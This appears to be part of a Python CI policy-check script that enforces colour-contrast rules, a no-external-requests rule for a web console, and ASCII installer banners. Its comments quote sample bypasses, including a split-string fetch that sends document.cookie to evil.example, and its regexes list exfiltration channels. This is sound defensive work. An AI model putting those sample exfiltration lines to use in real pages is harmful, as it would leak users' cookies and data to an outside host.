        absent = [t for t in REQUIRED_TOKENS if not HEX_RE.match(tokens.get(t, ""))]
        if absent:
            f.fail("PALETTE", path, None,
                   f"{mode}: {', '.join(absent)} missing or unreadable. These are the "
                   f"tokens this rule exists to measure; without them it would report "
                   f"PASS having checked nothing.")

        surfaces = [(t, tokens[t]) for t in SURFACE_TOKENS if HEX_RE.match(tokens.get(t, ""))]
        if not surfaces:
            f.fail("PALETTE", path, None, f"{mode}: no surface tokens to measure against")
            continue

        # Ink carries 10px labels and 11px timestamps — small text on every
        # surface it can land on, so 4.5:1 on every surface. "Faint" is
        # carried by size, weight and tracking, never by going illegible.
        for token in INK_TOKENS:
            value = tokens.get(token)
            if not value or not HEX_RE.match(value):
                continue
            for surface_name, surface in surfaces:
                ratio = vp.contrast(value, surface)
                if ratio < TEXT_CONTRAST_MIN:
                    f.fail("PALETTE", path, None,
                           f"{mode}: {token} ({value}) is {ratio:.2f}:1 on {surface_name} "
                           f"({surface}), below the {TEXT_CONTRAST_MIN}:1 floor for the "
                           f"small text it carries")

        accent = tokens.get("--mg-accent", "")
        if HEX_RE.match(accent):
            for surface_name, surface in surfaces:
                ratio = vp.contrast(accent, surface)
                if ratio < NONTEXT_CONTRAST_MIN:
                    f.fail("PALETTE", path, None,
                           f"{mode}: --mg-accent ({accent}) is {ratio:.2f}:1 on "
                           f"{surface_name}, below the {NONTEXT_CONTRAST_MIN}:1 floor for "
                           f"focus rings")

        # Status text sits on its own tinted background and is read under
        # pressure. Same small-text floor.
        for fg_token, bg_token in STATUS_PAIRS:
            fg, bg = tokens.get(fg_token, ""), tokens.get(bg_token, "")
            if not (HEX_RE.match(fg) and HEX_RE.match(bg)):
                continue
            ratio = vp.contrast(fg, bg)
            if ratio < TEXT_CONTRAST_MIN:
                f.fail("PALETTE", path, None,
                       f"{mode}: {fg_token} ({fg}) on {bg_token} ({bg}) is {ratio:.2f}:1, "
                       f"below the {TEXT_CONTRAST_MIN}:1 floor")

        # Chart series: the full categorical battery, against the chart
        # surface. --mg-ground is what the panels sit on.
        series = [tokens[name] for name in
                  sorted((n for n in tokens if SERIES_RE.match(n)),
                         key=lambda n: int(SERIES_RE.match(n).group(1)))
                  if HEX_RE.match(tokens[name])]
        if len(series) < REQUIRED_SERIES:
            f.fail("PALETTE", path, None,
                   f"{mode}: found {len(series)} readable --mg-series-* token(s), need at "
                   f"least {REQUIRED_SERIES}. The dashboard plots accepted against "
                   f"absorbed; with fewer series the colour-vision battery below would "
                   f"not run and this rule would pass having proved nothing.")
            continue
        surface = tokens.get("--mg-ground", "")
        report, ok = vp.validate(series, mode, surface)
        for name, state, detail in report:
            if state is False or state == "fail":
                f.fail("PALETTE", path, None, f"{mode}: series {name} — {detail}")
            elif state in ("floor", "relief"):
                # Both WARN bands are legal only alongside secondary encoding
                # (direct labels, gaps, texture, or a table view). Surfaced so
                # the obligation is visible rather than assumed.
                f.note(f"{mode}: series {name} — {detail} [requires secondary encoding]")
        if ok:
            f.note(f"{mode}: {len(series)} chart series pass the categorical checks "
                   f"against {surface}")

    # A status colour that equals a series colour makes an alarm look like data.
    for mode, tokens in modes.items():
        status = {tokens.get(t, "").lower() for pair in STATUS_PAIRS for t in pair}
        for name in sorted(n for n in tokens if SERIES_RE.match(n)):
            if tokens[name].lower() in status:
                f.fail("PALETTE", path, None,
                       f"{mode}: {name} ({tokens[name]}) is also a status colour. Status is "
                       f"reserved — a series wearing it impersonates an alarm.")


# ---------------------------------------------------------------------------
# UI-SELF-CONTAINED
#
# ui/shield/index.html claims two things about itself: that it makes no
# external requests, and that it invents no colours. Both are load-bearing and
# both are cheap to check, so neither is left as a promise in a comment.
#
# The egress half is a security property. The shield console ships on the edge
# node — the most exposed thing we build, and the page an operator opens
# precisely when something is wrong. A CDN reference there is an availability
# dependency on a third party during an incident, a privacy leak of who is
# under attack and when, and a supply-chain hole in a product whose entire
# pitch is not being MagnusBilling.
#
# The colour half keeps the PALETTE rule meaningful. A hex literal in a
# stylesheet routes straight around the contrast and colour-vision checks,
# which only ever see tokens.css.
#
# WHAT THIS RULE DOES NOT CATCH, stated so it is not mistaken for more than
# it is: a URL assembled at runtime from pieces ("htt" + "ps://…", new URL()
# on a variable) is invisible to a text scan, and so is anything fetched by
# code this gate never sees. The rule targets the realistic failure — someone
# reaching for a CDN or a web font out of habit — not a determined insider.
# The actual enforcement for the hostile case is a Content-Security-Policy
# header served by the node agent, which does not exist yet (issue #4); when
# it does, THAT is the control and this becomes the early warning.
#
# `data:` URIs are deliberately allowed: they are self-contained and make no
# request, which is the property being protected.
# ---------------------------------------------------------------------------

UI_DIR = "ui"
TOKENS_BASENAME = "tokens.css"

# SVG and XHTML namespace URIs are identifiers, not fetches — createElementNS
# requires the literal string and nothing is ever requested from it.
URL_ALLOWLIST = (
    "http://www.w3.org/2000/svg",
    "http://www.w3.org/1999/xhtml",
)

# Scanned against the WHOLE file, not line by line. An HTML attribute value
# may contain a literal newline, so `<img src="https://\nevil.example/x.png">`
# split the scheme from the host across two lines and passed a per-line scan
# clean. \s* inside the pattern lets the match span that break.
EXTERNAL_URL_RE = re.compile(r"https?:\s*//\s*[^\s\"'()<>]+")
# The quotes are optional: HTML attribute values may be unquoted, and
# <img src=//evil.example.com/x.png> is a perfectly ordinary way to write one.
PROTOCOL_RELATIVE_RE = re.compile(r"""(?:src|href|action)\s*=\s*["']?\s*//""", re.I)

# Every fetch() in shipped UI must name a same-origin absolute path as a
# plain string literal. This is the structural answer to the one thing a text
# scan genuinely cannot see:
#
#     fetch("ht" + "tps://evil.example/x?" + document.cookie)
#
# There is no regex that recognises a URL after the author has split it, and
# pretending otherwise would be exactly the overclaim this project keeps
# refusing to make. So the rule stops trying to recognise bad URLs and instead
# requires the good shape: a literal beginning with "/". A concatenation, a
# template literal, a variable or a new URL() is then a violation on its face,
# whatever it evaluates to.
FETCH_CALL_RE = re.compile(r"\bfetch\s*\(\s*([^,)]*)")
FETCH_LITERAL_RE = re.compile(r"""^["']/[^"']*["']$""")

# Channels that can reach the network without going through fetch(). Worker
# and serviceWorker are the sharpest: those load and execute remote code, not
# merely exfiltrate. Image().src is the oldest beacon trick there is.
DYNAMIC_REQUEST_RE = re.compile(
    r"\b(?:XMLHttpRequest|importScripts|EventSource|WebSocket|SharedWorker|Worker"
    r"|serviceWorker|sendBeacon|navigator\s*\.\s*\w+)\s*(?:\(|\.|\[)")

# Indirection that defeats ANY call-site text match — the same argument the
# fetch rule already makes, carried to its logical end. Matching `fetch(` is
# useless if the author can write `const f = fetch; f(...)`, or reach the same
# function as `window["fet" + "ch"]`. So the primitives that make a call site
# unreadable are themselves the violation, regardless of what follows.
INDIRECTION_RE = (
    (re.compile(r"=\s*(?:window\s*\.\s*|globalThis\s*\.\s*)?fetch\s*[;,\n)]"),
     "aliasing fetch to another name"),
    (re.compile(r"\{[^{}\n]*\b(?:fetch|sendBeacon|Worker|Image|XMLHttpRequest)\b"
                r"[^{}\n]*\}\s*=\s*(?:window|globalThis|self|navigator|top|parent)\b"),
     "destructuring a request primitive out of a global, which renames the call site"),
    (re.compile(r"\b(?:top|parent|frames)\s*\.\s*(?:location|postMessage)\b"),
     "reaching another browsing context"),
    (re.compile(r"\b(?:window|globalThis|navigator|self|document|top|parent|frames)\s*\["),
     "bracket property access on a global, which hides the name being called"),
    # top["fetch"](...) reached the same function with none of the literal
    # text any other pattern looks for; top/parent/frames were listed in the
    # destructuring pattern but missing from this one.
    (re.compile(r"\.\s*(?:src|action|href|formAction)\s*=(?!=)"),
     "assigning a navigation or resource property in script, which issues a request "
     "this gate cannot read"),
    (re.compile(r"\.\s*submit\s*\(|\bsetAttribute\s*\(\s*[\"']style[\"']"),
     "submitting a form or setting style wholesale from script"),
    # The "colour tokens live in exactly one file" guarantee is a static one.
    # Writing a --mg-* custom property at runtime steps around it entirely,
    # with no literal for the colour checks to see.
    (re.compile(r"setProperty\s*\(\s*[\"']--mg-"),
     "setting a --mg-* token at runtime, which defeats the single-source guarantee "
     "that the contrast and colour-vision checks depend on"),
    (re.compile(r"\bnew\s+Function\b|\beval\s*\("),
     "constructing code at runtime"),
)
# Exactly the lengths CSS accepts for a hex colour, so ids like #chart-x and
# entities like &#39; are not mistaken for one.
HEX_LITERAL_RE = re.compile(r"#(?:[0-9a-fA-F]{8}|[0-9a-fA-F]{6}|[0-9a-fA-F]{4}|[0-9a-fA-F]{3})\b")
COLOUR_FN_RE = re.compile(r"\b(?:rgba?|hsla?|hwb|lab|lch|oklab|oklch|color)\s*\(")


BLOCK_COMMENT_RE = re.compile(r"/\*.*?\*/|<!--.*?-->", re.S)


def blank_block_comments(text: str) -> str:
    """Blank out /* */ and <!-- --> comments, preserving line count.

    Line-by-line stripping is not enough and this is not hypothetical: the
    first run of this rule flagged the word "rgba()" inside a multi-line
    comment that exists to explain why the file does not use rgba(). The
    configs hit the identical trap earlier in this file's history — prose
    about a rule must not trip the rule.

    JS `//` comments are handled separately, by blank_line_comments below.
    """
    return BLOCK_COMMENT_RE.sub(lambda m: re.sub(r"[^\n]", " ", m.group(0)), text)


def blank_line_comments(text: str) -> str:
    """Blank `//` comments, preserving line count — but only real ones.

    The naive version of this blinds the URL scanner completely: it eats
    everything after the "//" in "https://cdn.example/x", which is the exact
    string the rule is looking for. The naive version of NOT doing it fails
    the build on any comment that merely mentions a URL or a fetch call — so
    a note explaining why a CDN reference was removed becomes a CI failure.
    That is the same "prose about the rule trips the rule" trap this file
    already fixed once for block comments.

    So: walk the text tracking string state, and treat `//` as a comment only
    when it is outside a quote AND not immediately preceded by a colon (which
    makes it a scheme separator — the unquoted-HTML-attribute case).

    REGEX LITERALS. `const trailingSlash = /a\\//;` used to disable this file's
    checks for the rest of that line: the scanner had no notion of a regex, so
    it read the literal's closing `/` plus the following `/` as a comment
    opener and blanked everything after — including a real violation a few
    characters later. No adversarial intent required; any regex matching a
    slash is a landmine. So regex literals are tracked too, with the standard
    previous-significant-token heuristic for telling `/`-as-regex from
    `/`-as-division.

    The heuristic is imperfect, and it is deliberately biased. When it cannot
    decide, it does NOT blank: an unblanked comment can only ever produce a
    false positive, which is loud and gets fixed, while an over-eager blank
    silently switches the rules off. Given one of those has already happened
    here, the direction of the bias is not a matter of taste.
    """
    out = list(text)
    i, n = 0, len(text)
    quote = None          # ' " or `  — inside a string literal
    in_regex = False      # inside a /.../ literal
    in_class = False      # inside a [...] within that regex, where / is literal
    last_sig = ""         # last significant character seen outside a literal

    # A '/' opens a regex when what precedes it cannot end an expression.
    # After an identifier, number, ')', ']' or '}' it is division instead.
    # '<' is excluded on purpose: this scanner also walks HTML, where '</div>'
    # would otherwise look like the start of a regex.
    REGEX_PRECEDERS = set("(,=:[!&|?{};+-*%~^\n")

    while i < n:
        ch = text[i]

        if quote:
            if ch == "\\":
                i += 2
                continue
            if ch == quote:
                quote = None
            elif ch == "\n" and quote in ("'", '"'):
                quote = None  # unterminated literal; do not swallow the file
            i += 1
            continue

        if in_regex:
            if ch == "\\":
                i += 2
                continue
            # Character-class tracking is defence in depth, and honestly
            # labelled as such: mutation testing could not find an input where
            # deleting it changes the output. A slash inside [...] that
            # prematurely ends the "regex" is immediately followed by another
            # `/` that re-opens one (last_sig is not updated inside a
            # literal), so the blanking nets out identical. It is kept because
            # it makes the scanner model the language correctly rather than
            # correctly by luck — but no test discriminates it, and pretending
            # otherwise would be the kind of claim this file exists to stop.
            if ch == "[":
                in_class = True
            elif ch == "]":
                in_class = False
            elif ch == "/" and not in_class:
                in_regex = False
            elif ch == "\n":
                in_regex = in_class = False  # regexes do not span lines
            i += 1
            continue

        if ch in "'\"`":
            quote = ch
        elif (ch == "/" and i + 1 < n and text[i + 1] == "/"
              # ':' makes it a scheme separator (https://...). '=' makes it an
              # unquoted HTML attribute value (<img src=//host/x>), which was
              # being blanked wholesale and then missed by the protocol-
              # relative pattern too — a silent miss, the bad direction.
              # A JS `x = // comment` is the cost, and it is only ever a loud
              # false positive.
              and (i == 0 or text[i - 1] not in ":=")):
            while i < n and text[i] != "\n":
                out[i] = " "
                i += 1
            last_sig = "\n"
            continue
        elif ch == "/" and (last_sig in REGEX_PRECEDERS or last_sig == ""):
            in_regex, in_class = True, False

        if not ch.isspace() or ch == "\n":
            last_sig = ch
        i += 1
    return "".join(out)


# Browser-facing text formats this rule knows how to read.
SCANNED_SUFFIXES = {".html", ".htm", ".css", ".js", ".mjs", ".svg", ".json", ".webmanifest"}
# Tooling and documentation that lives beside the UI but is never served.
NOT_SERVED_SUFFIXES = {".py", ".md"}


def ui_files() -> tuple[list[Path], list[Path]]:
    """Return (files to scan, files with no scanner) under ui/.

    .svg is in the scanned set, and its omission was a real hole: an SVG is
    not an image, it is a document. It can carry <image href="https://...">, a
    <style> block, its own <script>, and raw fill="#8B9AA0" attributes that
    the PALETTE checks never see. Pulling one in with <link rel="icon"> was a
    clean bypass of both halves of this rule.

    Anything a browser can fetch but this gate cannot read comes back as
    unscannable and FAILS, rather than being quietly skipped — the same
    fail-closed posture the LICENCE rule takes on a dependency manifest it has
    no scanner for. Otherwise this rule is only ever as strong as the list of
    file extensions somebody happened to think of.
    """
    ui = REPO / UI_DIR
    if not ui.is_dir():
        return [], []
    scan: list[Path] = []
    unknown: list[Path] = []
    for path in sorted(ui.rglob("*")):
        if not path.is_file():
            continue
        # __pycache__ is CPython bytecode: unambiguously tooling output, never
        # served, and regenerated the moment anyone runs the tests. It is the
        # only name skipped by name.
        #
        # node_modules is NOT skipped, and that is a fix rather than an
        # oversight. Skipping a directory because of what it is called means a
        # file at ui/shield/node_modules/evil.js — reachable with a perfectly
        # ordinary <script src="node_modules/evil.js"> — is never opened. A
        # package tree under ui/ is reported below as something this gate
        # cannot audit, which is the honest answer: this project has no
        # JavaScript package manager, so one appearing is news.
        if "__pycache__" in path.parts or ".git" in path.parts:
            continue
        suffix = path.suffix.lower()
        if suffix in SCANNED_SUFFIXES:
            scan.append(path)
        elif suffix not in NOT_SERVED_SUFFIXES:
            unknown.append(path)
    return scan, unknown


def _line_of(source: str, offset: int) -> int:
    return source.count("\n", 0, offset) + 1


def check_ui_self_contained(f: Findings) -> None:
    files, unscannable = ui_files()

    for path in unscannable:
        f.fail("UI-SELF-CONTAINED", path, None,
               f"a browser can fetch this from {UI_DIR}/ but this rule has no scanner for "
               f"'{path.suffix or path.name}'. Assets are entering the shipped console "
               f"unchecked. Add the extension to SCANNED_SUFFIXES (and make sure the "
               f"checks below make sense for it) or to NOT_SERVED_SUFFIXES if it is never "
               f"served.")

    if not files:
        if not unscannable:
            f.note("no ui/ files yet — UI-SELF-CONTAINED not exercised")
        return

    for path in files:
        is_tokens = path.name == TOKENS_BASENAME
        # Scanned as ONE string rather than line by line. An HTML attribute
        # value may contain a literal newline, and splitting a URL across one
        # defeated the per-line scan completely. Comments of both kinds are
        # blanked first so that prose about a rule cannot trip that rule.
        source = blank_line_comments(
            blank_block_comments(path.read_text(encoding="utf-8", errors="replace")))

        for match in EXTERNAL_URL_RE.finditer(source):
            url = " ".join(match.group(0).split())
            if any(url.startswith(allowed) for allowed in URL_ALLOWLIST):
                continue
            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
                   f"references {url}. The shield console is served from the edge node "
                   f"and must load nothing from the internet — an operator opens it when "
                   f"things are already going wrong.")

        for match in PROTOCOL_RELATIVE_RE.finditer(source):
            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
                   "protocol-relative URL. Same rule: no external resources.")

        for match in DYNAMIC_REQUEST_RE.finditer(source):
            f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
                   f"{match.group(0).strip()} opens a request channel this rule cannot "
                   f"follow. The console fetches same-origin paths and nothing else — and "
                   f"Worker/serviceWorker would be loading remote code, not just leaking.")

        for pattern, what in INDIRECTION_RE:
            for match in pattern.finditer(source):
                f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
                       f"{what}. Every rule here reads source text, so an unreadable call "
                       f"site defeats all of them at once — `const f = fetch; f(...)` is "
                       f"the same bypass as a concatenated URL, one level up.")

        # Require the good shape rather than trying to recognise the bad one.
        for match in FETCH_CALL_RE.finditer(source):
            target = match.group(1).strip()
            if not FETCH_LITERAL_RE.match(target):
                f.fail("UI-SELF-CONTAINED", path, _line_of(source, match.start()),
                       f"fetch({target or '…'}…) does not name a same-origin path as a "
                       f"plain string literal starting with '/'. A concatenation, template "
                       f"literal or variable is a URL this gate cannot read — and "
                       f'fetch("ht" + "tps://…") is exactly how a text scan gets walked '
                       f"past.")

        # tokens.css is where colours are allowed to be literal; that is the
        # whole point of it, and the PALETTE rule reads them there.
        if is_tokens:
            continue
        for pattern in (HEX_LITERAL_RE, COLOUR_FN_RE):
            for match in pattern.finditer(source):
                line_no = _line_of(source, match.start())
                f.fail("UI-SELF-CONTAINED", path, line_no,
                       f"colour literal {match.group(0)!r} outside {UI_DIR}/"
                       f"{TOKENS_BASENAME}. Use a --mg-* token: literals here are "
                       f"invisible to the PALETTE contrast and colour-vision checks.")

    f.note(f"{len(files)} ui/ file(s) scanned for external requests, request channels "
           f"and colour literals")


# ---------------------------------------------------------------------------
# INSTALLER-ASSETS
#
# The wizard's masthead is the first thing an operator ever sees of this
# product, and it is rendered in the least forgiving place a program ever
# renders: a fresh Debian box over SSH, often with LANG=C, sometimes on a
# provider's serial console, sometimes in a rescue shell.
#
# A banner that arrives as "â??â??â??" says "built by people who never ran
# this on a real server" before the operator has read a word. So: 7-bit ASCII
# only, no box-drawing, no smart quotes, no em dashes — and 78 columns, so it
# cannot wrap in an 80-column terminal, because a wrapped banner looks worse
# than no banner at all.
#
# All of which is easy to promise in a README and easy to break with one
# copy-paste out of a document that helpfully replaced the hyphens.
# ---------------------------------------------------------------------------

INSTALL_DIR = "install"
BANNER_MAX_COLUMNS = 78
BANNER_MIN_COLUMNS = 20  # narrow variant still has to look like something


def check_installer_assets(f: Findings) -> None:
    install = REPO / INSTALL_DIR
    if not install.is_dir():
        f.note("no install/ directory yet — INSTALLER-ASSETS not exercised")
        return

    banners = sorted(install.glob("banner-*.txt"))
    if not banners:
        f.fail("INSTALLER-ASSETS", install, None,
               "install/ exists but carries no banner-*.txt. The wizard renders one; "
               "if it has moved, this rule must move with it rather than passing "
               "vacuously.")
        return

    for banner in banners:
        raw = banner.read_bytes()
        try:
            text = raw.decode("ascii")
        except UnicodeDecodeError as exc:
            offending = raw[exc.start:exc.end]
            f.fail("INSTALLER-ASSETS", banner, None,
                   f"contains non-ASCII byte(s) {offending!r} at offset {exc.start}. The "
                   f"masthead renders on consoles with LANG=C and on serial terminals — "
                   f"anything outside 7-bit ASCII arrives as mojibake. Box-drawing "
                   f"characters, smart quotes and em dashes are the usual way this gets "
                   f"broken.")
            continue

        if "\t" in text:
            f.fail("INSTALLER-ASSETS", banner, None,
                   "contains a tab. Tab stops differ between terminals, so the art will "
                   "shear. Use spaces.")

        for n, line in enumerate(text.splitlines(), start=1):
            if len(line) > BANNER_MAX_COLUMNS:
                f.fail("INSTALLER-ASSETS", banner, n,
                       f"line is {len(line)} columns, over the {BANNER_MAX_COLUMNS} "
                       f"limit. It will wrap in an 80-column terminal, and a wrapped "
                       f"banner looks worse than no banner.")

        widths = [len(line) for line in text.splitlines() if line.strip()]
        if widths and max(widths) < BANNER_MIN_COLUMNS:
            f.fail("INSTALLER-ASSETS", banner, None,
                   f"widest line is only {max(widths)} columns — that is not a masthead")

    names = {b.name for b in banners}
    for required in ("banner-wide.txt", "banner-narrow.txt"):
        if required not in names:
            f.fail("INSTALLER-ASSETS", install, None,
                   f"missing {required}. The wizard picks by terminal width; without "
                   f"both, a narrow terminal gets a wrapped banner.")

    wide = install / "banner-wide.txt"
    narrow = install / "banner-narrow.txt"
    if wide.is_file() and narrow.is_file():
        def widest(p: Path) -> int:
            try:
                return max((len(l) for l in p.read_text(encoding="ascii",
                                                        errors="replace").splitlines()),
                           default=0)
            except OSError:
                return 0
        if widest(narrow) >= widest(wide):
            f.fail("INSTALLER-ASSETS", narrow, None,
                   f"the narrow banner ({widest(narrow)} cols) is not narrower than the "
                   f"wide one ({widest(wide)} cols), so choosing between them does "
                   f"nothing")

    f.note(f"{len(banners)} installer banner(s) checked: ASCII-only, "
           f"<= {BANNER_MAX_COLUMNS} columns")


# ---------------------------------------------------------------------------

CHECKS = (
    check_kamailio_names,
    check_edge_holds_no_credentials,
    check_core_binds_private,
    check_route_targets,
    check_source_rules,
    check_licence,
    check_theme_blocks_in_sync,
    check_palette,
    check_ui_self_contained,
    check_installer_assets,
)


def main() -> int:
    f = Findings()
    for check in CHECKS:
        check(f)

    print(f"MEGATRON policy gate — {len(CHECKS)} rule groups, repo at {REPO}")
    print()

    for note in f.notes:
        print(f"  note: {note}")
    if f.notes:
        print()

    if not f.violations:
        print("PASS — no policy violations.")
        return 0

    print(f"FAIL — {len(f.violations)} violation(s):")
    print()
    for v in f.violations:
        print(f"  {v}")
    print()
    print("These rules exist because the incumbent platforms failed in exactly these")
    print("ways. If one is genuinely wrong, change the rule deliberately in")
    print("ci/policy_check.py and say why in the PR — do not work around it.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
